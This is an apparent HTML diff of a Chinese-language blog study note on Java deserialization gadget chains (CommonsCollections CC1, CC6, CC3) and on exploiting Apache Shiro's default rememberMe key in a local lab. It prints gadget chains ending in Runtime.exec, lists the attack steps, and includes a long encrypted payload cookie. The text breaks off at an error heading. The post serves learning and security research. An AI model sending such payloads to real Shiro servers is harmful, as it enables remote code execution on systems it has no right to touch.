@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Shiro反序列化初探 CC6改TemplatesImpl - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="Shiro反序列化初探 CC6改TemplatesImpl">
+  <meta itemprop="datePublished" content="2024-08-16T17:20:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-16T17:20:01+08:00">
+  <meta itemprop="wordCount" content="606">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/250/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="Shiro反序列化初探 CC6改TemplatesImpl">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-16T17:20:01+08:00">
+    <meta property="article:modified_time" content="2024-08-16T17:20:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Shiro反序列化初探 CC6改TemplatesImpl">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/250/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/3/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Shiro反序列化初探 CC6改TemplatesImpl",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/250\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  606 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/250\/","datePublished": "2024-08-16T17:20:01+08:00","dateModified": "2024-08-16T17:20:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Shiro反序列化初探 CC6改TemplatesImpl</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Shiro反序列化初探 CC6改TemplatesImpl</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-16 17:20:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-16">2024-08-16</time></span>&nbsp;<span title="606 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 700 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="回顾" class="heading-element"><span>0.0.0.1  回顾</span>
+  <a href="#%e5%9b%9e%e9%a1%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>至此已经学习了urldns、cc1 tf、cc1 lz、cc6、cc3，当然urldns只算初探java反序列化，先做一个简单的总结回顾吧</p>
+<h6 id="cc1-tf" class="heading-element"><span>0.0.0.1.1  cc1 tf</span>
+  <a href="#cc1-tf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>这是踏足java反序列化的第一条链子，也是我花时间最多的链子，麻烦的一批，它的执行点是InvokerTransformer，就像一个写好的后门，是梦的起点，这里我费好大力气分析通了数组中插入一条数据是怎么触发链子的，最麻烦的还是AnnotationInvocationHandler#readObject，是反序列化的起点，需要去反编译的代码里分析</p>
+<p>它的历史任务是开启了java反序列化rce的篇章</p>
+<p>但是这个反序列化的起点很快就被修复了，所以需要cc1 lz</p>
+<pre tabindex="0"><code>反序列化#readObject-&gt;
+	AnnotationInvocationHandler#readObject(存在setValue)
+		MapEntry#setValue(存在checkSetValue)
+			transformedMap#checkSetValue(存在transform)
+				InvokerTransformer.transform(就可以调用任意方法执行任意操作)</code></pre><h6 id="cc1-lz" class="heading-element"><span>0.0.0.1.2  cc1 lz</span>
+  <a href="#cc1-lz" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>cc1 tf的触发需要写入数组，但是被修复了，lazymap中的get方法也可以触发到ChainedTransformer.transform()，所以我们重新寻找了哪里能触发get，发现cc1 tf的反序列化触发点AnnotationInvocationHandler中有一个invoke方法会调用get，而这个类还继承了InvocationHandler接口，所以我们能用==动态代理==的方法去触发这个invoke方法，而它的反序列化方法中的操作又恰好能让我们跳过种种判断成功触发get，这样一个cc1的升级版就完成了</p>
+<p>它的历史任务是绕过了对cc1 tf反序列化触发点的修复。</p>
+<pre tabindex="0"><code>	Gadget chain:
+		ObjectInputStream.readObject()
+			AnnotationInvocationHandler.readObject()
+				Map(Proxy).entrySet()
+					AnnotationInvocationHandler.invoke()
+						LazyMap.get()
+							ChainedTransformer.transform()
+								ConstantTransformer.transform()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Class.getMethod()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.getRuntime()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.exec()</code></pre><h6 id="cc6" class="heading-element"><span>0.0.0.1.3  cc6</span>
+  <a href="#cc6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>Java 8u71以后，cc1就不能用了，这次对AnnotationInvocationHandler的readObject()进行了全面修复，所以需要新的反序列化触发点，这次就找到了TiedMapEntry简称tme，它的getValue方法也能调用lazymap的get方法，然后就是网上找调用链了</p>
+<p>它的历史任务其实和cc1 lz类似，是完成了对==jdk高版本修复的绕过==，看起来是一条通杀的链子。</p>
+<pre tabindex="0"><code>/*
+Gadget chain:
+java.io.ObjectInputStream.readObject()
+java.util.HashMap.readObject()
+java.util.HashMap.hash()
+org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+
+org.apache.commons.collections.map.LazyMap.get()
+org.apache.commons.collections.functors.ChainedTransformer.transform()
+org.apache.commons.collections.functors.InvokerTransformer.transform()
+java.lang.reflect.Method.invoke()
+java.lang.Runtime.exec()
+*/</code></pre><h6 id="cc3" class="heading-element"><span>0.0.0.1.4  cc3</span>
+  <a href="#cc3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>cc3之前我们的反序列化链执行点都是InvokerTransformer，这里就产生了历史性变革，就是有了新的执行点：==字节码执行==，而且字节码执行的灵活性和危害更大，后半段链子直接改换了，执行的地方是TemplatesImpl。并且此时InvokerTransformer已经被一众waf拉黑，所以也急需其他的链条补充进来。</p>
+<p>因为要对接上TemplatesImpl的newTransformer，所以前半段链子也进行了改变，找到了两个新的类InstantiateTransformer和TrAXFilter，然后再去往前承接TransformedMap-&gt;transformerChain</p>
+<p>它的历史任务是开创了新的执行点和寻找了新的中间段的利用链。但是CC3依然有版本限制，是不能在8u71以上利用的</p>
+<pre tabindex="0"><code>TransformedMap-&gt;transformerChain的transform-&gt;
+InstantiateTransformer的transform -&gt; TrAXFilter的构造函数-&gt;
+
+ -&gt; TemplatesImpl#newTransformer() -&gt;
+TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()
+-&gt; TransletClassLoader#defineClass()</code></pre><p>至此可以发现这些利用链就像积木一样，或者更像那种玩具水管道，可以相互拼接，只要保证最终从反序列化触发点串联到执行点，就是一条可用的链子</p>
+<p>接下来cc家族还有cc4、cc2、cc5还没学习，这里先初步接触shiro，以及学习如何灵活拼接这些链子。</p>
+<p>p神的文章名字叫TemplatesImpl在Shiro中的利用，执行点应该就是cc3的后半段，前半段不知道进行了什么拼接。</p>
+<h5 id="shiro初识" class="heading-element"><span>0.0.0.2  shiro初识</span>
+  <a href="#shiro%e5%88%9d%e8%af%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>对shiro的漏洞早有耳闻，16年的时候，shiro爆出了一个默认key的反序列化漏洞，它有一个rememberMe字段，在Shiro 1.2.4版本之前甚至是默认且固定的key，这个key应该就是用来对rememberMe传递的数据进行加密的，然后shiro会对解密以后的序列化数据进行反序列化，我们学了这么久的序列化，要是目标没有可用的反序列化点也是徒劳，shiro就提供了一个覆盖面很广的反序列化点，拿到key=rce</p>
+<p>还是跟着p神的思路，他搭建了一个简单的应用使用了shiro</p>
+<blockquote>
+<p>shiro-core、shiro-web，这是shiro本身的依赖</p>
+<p>javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这
+两个依赖</p>
+<p>slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖</p>
+<p>commons-logging，这是shiro中用到的一个接口，不添加会爆</p>
+<p>java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory 错误</p>
+<p>commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖</p>
+</blockquote>
+<p>我们使用mvn package 将项目打包成war包，放在Tomcat的webapps目录下。然后访问http://localhost:8080/shirodemo/ ，会跳转到登录页面</p>
+<p>然后输入正确的账号密码，root/secret，成功登录</p>
+<p>如果登录时选择了remember me的多选框，则登录成功后服务端会返回一个rememberMe的Cookie：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161123573.webp" alt="image-20240816112314383" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161123573.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161123573.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161123573.webp?size=large 2x" data-title="image-20240816112314383" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161121610.webp" alt="image-20240816112117336" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161121610.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161121610.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161121610.webp?size=large 2x" data-title="image-20240816112117336" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>对此，我们攻击过程如下：</p>
+<ol>
+<li>使用以前学过的CommonsCollections利用链生成一个序列化Payload</li>
+<li>使用Shiro默认Key进行加密</li>
+<li>将密文作为rememberMe的Cookie发送给服务端</li>
+</ol>
+<p>使用p神编写的Client0.java进行poc生成，其中用到的Gadget是CommonsCollections6</p>
+<pre tabindex="0"><code>eT1bVCfLiHPrJTVhv/gWzBH6SUzpRLrWlA60xJdES2eOue3OOsxFEwYku7JptstozSivxdWVqjVKNRHYLolrwnaNZdwt+1yXOKm7FblFuzvDHLMuKhm53QYAFz8ad4ps7zn6hSJ12E25AoNVhhJ0gZ2WC5UN+dJRSZDA4pp7b9Y+pgjdtAh5XkSKCPsAmRJZjjK7izFP1Z0PTUFRwylSygUsiR9yBvMz9Kd4pNRXjfmkZ4x3uPWL5wLzUrLdp+VI4758X9sh511TAsvVbisxbRZxnNdCcXBw/bkltk+sn5gRiSV2x4rcFH5WjbG+H3VI68V43wSaHJibzoYPoBDZyY12vf/od02gBLqqlw3dYLTag33BK277fG0QG5Vl1U8VwBJmhzTEW1ams8QIU6+KIY0ZUao5M46vNaMbIu+aslbeMn4dUcHD4a8Nf6fH2ZD+IQ0mn6gEiOgcEJ8FcgG0xDDggk4JbwEEwF9TUAakndu9c0F4jLE0ZGT2S8bwfkHezjoJ9XZ0Ri5O59/JkdfMd/lfJpWcv7aWrdRMJJwd+Yt3QHO71i84Muiv0NxRyoWwz0/63OwJx6hZJox7NlNu/kGaNURlnkznV1Lu8figas5aK7RxVXIwYdcO+K8feaNY5TptOmW95AcFMygViCFdBKjBn3WMDl3nznnkEd2k5snSdWPgZWh6V9finouHn5/l/y5K2DZeI/j8oQwnN3nbgBUHk1YaOwQffCDkgnUc7OLAQt+IUs3zEgqMFZEf5IsmGsBZpP3/BH68eNUUH1Rugn5kYmiT2bmTtOGZpDnwaWLQUc/Ijrcm+j7+6WvA28qVbUJfH+N8FXIcSUpaWaWil1nI3cycu4pnY9cQpJPKfWUA7R4RGMo9+5yyHPb/c/81+44SSaTMZL8NytrAHUDtD5AHF6couTmUH8pqy4SSmNWNKz6I2KiTHBKsuwYp7BPeL4RrZd7Qd2nWVgeCpx7A5TcaZrV5AK5ifwwgMs/dsNM+rLbxmVazez/CxL3+Z75JOGbm1CX98B+6ud3KLT96bhXPNdaTh8ENxR8Uy9Rs/tnr4Hxrk3hr2B4T0A30FKP7ifVIeYhYeRk6lLw2WR7RQtxlvrg7G1BKFS1XPR027WmX2Q4hnxKjlFN69yHf6RPyBTeWm8yDCZV5WTQvKGNBo6sxierS6pEKe8JVYjR5FZT46EkLCCbVaG1yttrILUC7LBtv0xVFmqqOz8/4DfzpytVVJaVsW1ikuVkk7ZkO4uDB2aGwkJreWCsHnzq9/7+R9EFiBbfzOMZL7vxrnLr3RaaXwstHc1DAJjsaSnQywetBoFukaNxl4PN7EbraCiFvgs2NbmDXhZS9y64p8wwdSPPYt8LXE26GhNG/57EhoN3h0kfKIS+QgG2dkQRP/lc90KtlCbDrrW2TCKqrByKFNTypnyBX5KJQ+P/qSZGVzI0rvqYlGxl40agWQ3SdKGAYz4X1Ur5qbuRGqd3oO5OIX09r4yeCaevBh7GFE+f8I+/flJRTfG0bNA13ezedv/JXEnBlrKsxR12dIbw7W+Na2RXdKHKPkL380IiXGgFYZjsMM3FyUA1nNHr89U8mOf+lsHharUasc/4S+NUxzpJHtUOyCyhR9m0b+cStVbHQ0Q5iGIpjt86SclcLlZXGt3I+290gqyI9JPtra8PsNkd7+KR4ECNfcSIcxvNTeY+kA2uAg0l+nu1Mc5jJEtq2Skk/</code></pre><p>发送给shiro。结果并没有弹出计算器，而是Tomcat出现了报错</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161127037.webp" alt="image-20240816112709757" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161127037.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161127037.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408161127037.webp?size=large 2x" data-title="image-20240816112709757" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>报错：</p>
